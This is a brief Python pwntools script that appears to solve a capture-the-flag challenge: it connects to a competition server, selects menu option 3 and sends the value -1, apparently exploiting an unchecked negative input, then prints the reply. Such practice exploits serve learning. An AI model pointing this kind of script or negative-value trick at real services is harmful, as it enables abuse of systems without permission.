from pwn import *

p = remote('market.challs.olicyber.it', 10005)
p.recvrepeat(timeout=0.5)
p.sendline(str(3))
p.recvrepeat(timeout=0.5)
p.sendline(str(-1))
print(p.recvrepeat(timeout=0.5))
